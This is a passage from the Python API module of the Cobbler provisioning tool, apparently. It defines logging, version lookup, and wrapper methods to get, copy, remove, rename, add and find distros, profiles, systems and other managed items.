'r')\n        data = fd.read().strip()\n        return float(data)\n\n    # ==========================================================\n\n    def log(self, msg: str, args=None, debug: bool = False):\n        \"\"\"\n        Logs a message with the already initiated logger of this object.\n\n        :param msg: The message to log.\n        :param args: Optional message which gets appended to the main msg with a ';'.\n        :param debug: Weather the logged message is a debug message (true) or info (false).\n\n        .. deprecated:: 3.3.0\n           We should use the standard logger.\n        \"\"\"\n        if debug:\n            logger = self.logger.debug\n        else:\n            logger = self.logger.info\n        if args is None:\n            logger(\"%s\" % msg)\n        else:\n            logger(\"%s; %s\" % (msg, str(args)))\n\n    # ==========================================================\n\n    def version(self, extended: bool = False) -> Union[float, Dict[str, Union[str, list]]]:\n        \"\"\"\n        What version is Cobbler?\n\n        If extended == False, returns a float for backwards compatibility\n        If extended == True, returns a dict:\n\n            gitstamp      -- the last git commit hash\n            gitdate       -- the last git commit date on the builder machine\n            builddate     -- the time of the build\n            version       -- something like \"1.3.2\"\n            version_tuple -- something like [ 1, 3, 2 ]\n\n        :param extended: False returns a float, True a Dictionary.\n        \"\"\"\n        config = ConfigParser()\n        config.read(\"/etc/cobbler/version\")\n        data: Dict[str, Union[str, list]] = {\n            \"gitdate\": config.get(\"cobbler\", \"gitdate\"),\n            \"gitstamp\": config.get(\"cobbler\", \"gitstamp\"),\n            \"builddate\": config.get(\"cobbler\", \"builddate\"),\n            \"version\": config.get(\"cobbler\", \"version\"),\n            \"version_tuple\": []\n        }\n        # dont actually read the version_tuple from the version file\n        for num in data[\"version\"].split(\".\"):\n            data[\"version_tuple\"].append(int(num))\n\n        if not extended:\n            # for backwards compatibility and use with koan's comparisons\n            elems = data[\"version_tuple\"]\n            return int(elems[0]) + 0.1 * int(elems[1]) + 0.001 * int(elems[2])\n        else:\n            return data\n\n    # ==========================================================\n\n    def get_item(self, what: str, name: str):\n        \"\"\"\n        Get a general item.\n\n        :param what: The item type to retrieve from the internal database.\n        :param name: The name of the item to retrieve.\n        :return: An item of the desired type.\n        \"\"\"\n        # self.log(\"get_item\", [what, name], debug=True)\n        item = self._collection_mgr.get_items(what).get(name)\n        return item\n\n    def get_items(self, what: str):\n        \"\"\"\n        Get all items of a collection.\n\n        :param what: The collection to query.\n        :return: The items which were queried. May return no items.\n        \"\"\"\n        # self.log(\"get_items\", [what], debug=True)\n        items = self._collection_mgr.get_items(what)\n        return items\n\n    def distros(self):\n        \"\"\"\n        Return the current list of distributions\n        \"\"\"\n        return self.get_items(\"distro\")\n\n    def profiles(self):\n        \"\"\"\n        Return the current list of profiles\n        \"\"\"\n        return self.get_items(\"profile\")\n\n    def systems(self):\n        \"\"\"\n        Return the current list of systems\n        \"\"\"\n        return self.get_items(\"system\")\n\n    def repos(self):\n        \"\"\"\n        Return the current list of repos\n        \"\"\"\n        return self.get_items(\"repo\")\n\n    def images(self):\n        \"\"\"\n        Return the current list of images\n        \"\"\"\n        return self.get_items(\"image\")\n\n    def settings(self):\n        \"\"\"\n        Return the application configuration\n        \"\"\"\n        return self._settings\n\n    def mgmtclasses(self):\n        \"\"\"\n        Return the current list of mgmtclasses\n        \"\"\"\n        return self.get_items(\"mgmtclass\")\n\n    def packages(self):\n        \"\"\"\n        Return the current list of packages\n        \"\"\"\n        return self.get_items(\"package\")\n\n    def files(self):\n        \"\"\"\n        Return the current list of files\n        \"\"\"\n        return self.get_items(\"file\")\n\n    def menus(self):\n        \"\"\"\n        Return the current list of menus\n        \"\"\"\n        return self.get_items(\"menu\")\n\n    # =======================================================================\n\n    def copy_item(self, what: str, ref, newname: str):\n        \"\"\"\n        General copy method which is called by the specific methods.\n\n        :param what: The collection type which gets copied.\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.log(\"copy_item(%s)\" % what, [ref.name, newname])\n        self.get_items(what).copy(ref, newname)\n\n    def copy_distro(self, ref, newname: str):\n        \"\"\"\n        This method copies a distro which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"distro\", ref, newname)\n\n    def copy_profile(self, ref, newname: str):\n        \"\"\"\n        This method copies a profile which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"profile\", ref, newname)\n\n    def copy_system(self, ref, newname: str):\n        \"\"\"\n        This method copies a system which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"system\", ref, newname)\n\n    def copy_repo(self, ref, newname: str):\n        \"\"\"\n        This method copies a repository which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"repo\", ref, newname)\n\n    def copy_image(self, ref, newname: str):\n        \"\"\"\n        This method copies an image which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"image\", ref, newname)\n\n    def copy_mgmtclass(self, ref, newname: str):\n        \"\"\"\n        This method copies a management class which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"mgmtclass\", ref, newname)\n\n    def copy_package(self, ref, newname: str):\n        \"\"\"\n        This method copies a package which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"package\", ref, newname)\n\n    def copy_file(self, ref, newname: str):\n        \"\"\"\n        This method copies a file which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"file\", ref, newname)\n\n    def copy_menu(self, ref, newname: str):\n        \"\"\"\n        This method copies a file which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"menu\", ref, newname)\n\n    # ==========================================================================\n\n    def remove_item(self, what: str, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a general item. This method should not be used by an external api. Please use the specific\n        remove_<itemtype> methods.\n\n        :param what: The type of the item.\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        if isinstance(what, str):\n            if isinstance(ref, str):\n                ref = self.get_item(what, ref)\n                if ref is None:\n                    return  # nothing to remove\n        self.log(\"remove_item(%s)\" % what, [ref.name])\n        self.get_items(what).remove(ref.name, recursive=recursive, with_delete=delete, with_triggers=with_triggers)\n\n    def remove_distro(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a distribution from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"distro\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_profile(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a profile from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"profile\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_system(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a system from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"system\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_repo(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a repository from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"repo\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_image(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a image from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"image\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_mgmtclass(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a management class from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"mgmtclass\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_package(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a package from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"package\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_file(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a file from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"file\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_menu(self, ref, recursive=False, delete=True, with_triggers=True):\n        \"\"\"\n        Remove a menu from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"menu\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    # ==========================================================================\n\n    def rename_item(self, what: str, ref, newname: str):\n        \"\"\"\n        Remove a general item. This method should not be used by an external api. Please use the specific\n        rename_<itemtype> methods.\n\n        :param what: The type of object which should be renamed.\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.log(\"rename_item(%s)\" % what, [ref.name, newname])\n        self.get_items(what).rename(ref, newname)\n\n    def rename_distro(self, ref, newname: str):\n        \"\"\"\n        Rename a distro to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"distro\", ref, newname)\n\n    def rename_profile(self, ref, newname: str):\n        \"\"\"\n        Rename a profile to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"profile\", ref, newname)\n\n    def rename_system(self, ref, newname: str):\n        \"\"\"\n        Rename a system to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"system\", ref, newname)\n\n    def rename_repo(self, ref, newname: str):\n        \"\"\"\n        Rename a repository to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"repo\", ref, newname)\n\n    def rename_image(self, ref, newname: str):\n        \"\"\"\n        Rename an image to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"image\", ref, newname)\n\n    def rename_mgmtclass(self, ref, newname: str):\n        \"\"\"\n        Rename a management class to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"mgmtclass\", ref, newname)\n\n    def rename_package(self, ref, newname: str):\n        \"\"\"\n        Rename a package to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"package\", ref, newname)\n\n    def rename_file(self, ref, newname: str):\n        \"\"\"\n        Rename a file to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"file\", ref, newname)\n\n    def rename_menu(self, ref, newname: str):\n        \"\"\"\n        Rename a menu to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"menu\", ref, newname)\n\n    # ==========================================================================\n\n    # FIXME: add a new_item method\n\n    def new_distro(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty distro object. This distro is not automatically persisted. Persistance is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty Distro object.\n        \"\"\"\n        self.log(\"new_distro\", [is_subobject])\n        return distro.Distro(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_profile(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty profile object. This profile is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty Profile object.\n        \"\"\"\n        self.log(\"new_profile\", [is_subobject])\n        return profile.Profile(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_system(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty system object. This system is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty System object.\n        \"\"\"\n        self.log(\"new_system\", [is_subobject])\n        return system.System(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_repo(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty repo object. This repository is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty repo object.\n        \"\"\"\n        self.log(\"new_repo\", [is_subobject])\n        return repo.Repo(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_image(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty image object. This image is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty image object.\n        \"\"\"\n        self.log(\"new_image\", [is_subobject])\n        return image.Image(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_mgmtclass(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty mgmtclass object. This mgmtclass is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty mgmtclass object.\n        \"\"\"\n        self.log(\"new_mgmtclass\", [is_subobject])\n        return mgmtclass.Mgmtclass(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_package(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty package object. This package is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty Package object.\n        \"\"\"\n        self.log(\"new_package\", [is_subobject])\n        return package.Package(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_file(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty file object. This file is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty File object.\n        \"\"\"\n        self.log(\"new_file\", [is_subobject])\n        return file.File(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_menu(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty menu object. This file is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty File object.\n        \"\"\"\n        self.log(\"new_menu\", [is_subobject])\n        return menu.Menu(self._collection_mgr, is_subobject=is_subobject)\n\n    # ==========================================================================\n\n    def add_item(self, what: str, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add an abstract item to a collection of its specific items. This is not meant for external use. Please reefer\n        to one of the specific methods ``add_<type>``.\n\n        :param what: The item type.\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.log(\"add_item(%s)\" % what, [ref.name])\n        self.get_items(what).add(ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_distro(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a distribution to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"distro\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_profile(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a profile to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"profile\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_system(self, ref, check_for_duplicate_names: bool = False, check_for_duplicate_netinfo=False,\n                   save: bool = True):\n        \"\"\"\n        Add a system to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param check_for_duplicate_netinfo: If the name of the network interface should be unique or can be present\n                                            multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"system\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_repo(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a repository to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"repo\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_image(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add an image to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"image\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_mgmtclass(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a management class to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"mgmtclass\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_package(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a package to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"package\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_file(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a file to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"file\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_menu(self, ref, check_for_duplicate_names=False, save=True):\n        \"\"\"\n        Add a submenu to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"menu\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    # ==========================================================================\n\n    def find_items(self, what: str, criteria: dict = None, name: str = \"\", return_list: bool = True,\n                   no_errors: bool = False):\n        \"\"\"\n        This is the abstract base method for finding object int the api. It should not be used by external resources.\n        Please reefer to the specific implementations of this method called ``find_<object type>``.\n\n        :param what: The object type of the item to search for.\n        :param criteria: The dictionary with the key-value pairs to find objects with.\n        :param name: The name of the object.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :return: The list of items witch match the search criteria.\n        \"\"\"\n        # self.log(\"find_items\", [what])\n        if criteria is None:\n            criteria = {}\n\n        if what == \"\" and (\"name\" in criteria or name is not None):\n            return self.__find_by_name(criteria.get(\"name\", name))\n\n        if what not in [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]:\n            raise ValueError(\"what needs to be a valid collection!\")\n\n        items = self._collection_mgr.get_items(what)\n        return items.find(name=name, return_list=return_list, no_errors=no_errors, **criteria)\n\n    def __find_by_name(self, name: str):\n        \"\"\"\n        This is a magic method which just searches all collections for the specified name directly,\n        :param name: The name of the item(s).\n        :return: The found item or None.\n        \"\"\"\n        if not isinstance(name, str):\n            raise TypeError(\"name of an object must be of type str!\")\n        collections = [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]\n        for collection_name in collections:\n            match = self.find_items(collection_name, name=name, return_list=False)\n            if match is not None:\n                return match\n        return None\n\n    def find_distro(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a distribution via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.distros().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_profile(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a profile via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.profiles().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_system(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a system via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.systems().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_repo(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a repository via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.repos().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_image(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find an image via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.images().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_mgmtclass(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a management class via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.mgmtclasses().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_package(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a package via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.packages().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_file(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a file via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.files().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_menu(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a menu via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.menus().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    # ==========================================================================\n\n    def __since(self, mtime: float, collector, collapse: bool = False) -> list:\n        \"\"\"\n        Called by get_*_since functions. This is an internal part of Cobbler.\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collector: The list of objects to filter after mtime.\n        :param collapse: Whether the object should be collapsed to a dict or not. If not the item objects are used for\n                         the list.\n        :return: The list of objects which are newer then the given timestamp.\n        \"\"\"\n        results1 = collector()\n        results2 = []\n        for x in results1:\n            if x.mtime == 0 or x.mtime >= mtime:\n                if not collapse:\n                    results2.append(x)\n                else:\n                    results2.append(x.to_dict())\n        return results2\n\n    def get_distros_since(self, mtime: float, collapse: bool = False):\n        \"\"\"\n        Returns distros modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: collapse=True specifies returning a dict instead of objects.\n        :return: The list of distros which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.distros, collapse=collapse)\n\n    def get_profiles_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Returns profiles modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of profiles which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.profiles, collapse=collapse)\n\n    def get_systems_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return systems modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of systems which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.systems, collapse=collapse)\n\n    def get_repos_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return repositories modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of repositories which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.repos, collapse=collapse)\n\n    def get_images_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return images modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of images which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.images, collapse=collapse)\n\n    def get_mgmtclasses_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return management classes modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of management classes which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.mgmtclasses, collapse=collapse)\n\n    def get_packages_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return packages modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of packages which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.packages, collapse=collapse)\n\n    def get_files_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return files modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of files which are newer then the given timestamp.\n        